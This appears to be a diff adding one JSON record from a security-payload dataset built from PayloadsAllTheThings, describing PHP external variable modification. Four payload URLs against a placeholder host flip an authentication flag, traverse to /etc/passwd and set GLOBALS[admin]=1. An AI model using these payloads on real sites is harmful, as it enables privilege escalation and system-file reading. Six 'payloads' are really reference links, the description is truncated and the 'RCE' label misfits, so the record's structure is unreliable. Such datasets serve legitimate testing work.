@@ -1,0 +1,22 @@
+{
+  "id": "rce-119673bdfd71",
+  "category": "RCE",
+  "title": "README",
+  "description": "# External Variable Modification\n\n> External Variable Modification Vulnerability occurs when a web application improperly handles user input, allowing attackers to overwrite internal variables. In PHP, functions like extract($_GET), extract($_POST), or import_request_variables() can be abused if they import user-controlled data into the global scope without proper validation. This can lead to security issues such as unauthorized changes to application logic, privilege escalation, or bypassing se",
+  "payloads": [
+    "http://example.com/vuln.php?authenticated=true",
+    "http://example.com/vuln.php?authenticated=1",
+    "http://example.com/vuln.php?page=../../etc/passwd",
+    "http://example.com/vuln.php?GLOBALS[admin]=1",
+    "* [CWE-473: PHP External Variable Modification - Common Weakness Enumeration - November 19, 2024](https://cwe.mitre.org/data/definitions/473.html)",
+    "* [CWE-621: Variable Extraction Error - Common Weakness Enumeration - November 19, 2024](https://cwe.mitre.org/data/definitions/621.html)",
+    "* [Function extract - PHP Documentation - March 21, 2001](https://www.php.net/manual/en/function.extract.php)",
+    "* [$GLOBALS variables - PHP Documentation - April 30, 2008](https://www.php.net/manual/en/reserved.variables.globals.php)",
+    "* [The Ducks - HackThisSite - December 14, 2016](https://github.com/HackThisSite/CTF-Writeups/blob/master/2016/SCTF/Ducks/README.md)",
+    "* [Extracttheflag! - Orel / WindTeam - February 28, 2024](https://ctftime.org/writeup/38076)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/External Variable Modification/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
